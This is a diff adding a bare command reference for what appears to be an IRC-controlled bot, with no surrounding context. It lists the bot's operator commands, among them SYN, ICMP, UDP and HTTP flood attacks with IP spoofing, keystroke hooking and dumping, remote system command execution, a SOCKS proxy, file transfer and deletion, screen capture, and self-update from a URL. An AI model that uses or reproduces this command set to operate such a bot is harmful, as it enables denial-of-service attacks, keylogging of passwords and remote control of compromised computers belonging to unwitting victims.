@@ -1,0 +1,44 @@
+Irc commands
+===========================================================================
+.auth.login <passwd>,<key> <digipass>
+.say.ip
+.auth.passwd <passwd> <key>
+.coreserver <ip:port>
+.httpserver <port> <root>
+.screen
+.active
+.dccsend <nick> <"fname"> <dccfname>
+.threads
+.move <"what"> <"to">
+.copy <"what"> <"to">
+.delete <what>
+.dns <ip/hostname>
+.ddos.spoofing <on/off>
+.ddos.syn <ip> <port> <minutes>
+.ddos.icmp <ip> <minutes>
+.ddos.udp <ip> <port> <minutes>
+.ddos.get <url> <nthreads> <minutes>
+.uptime
+.sys <reboot/logoff/off> [force]
+.install
+.unhookkeys
+.hookkeys
+.uninstall
+.dumpkeys
+.version
+.set
+.terminate
+.reconnect
+.httpupdate <url>
+.raw <string>
+.messagebox <string[?]>
+.identd <user>
+.socks <port>
+.leave
+.nick <nick/random>
+.join <#channel>
+.part <#channel>
+.system <cmd>
+.threads.kill <num>
+.threads.killtype <pattern>
+.threads.stopddos 
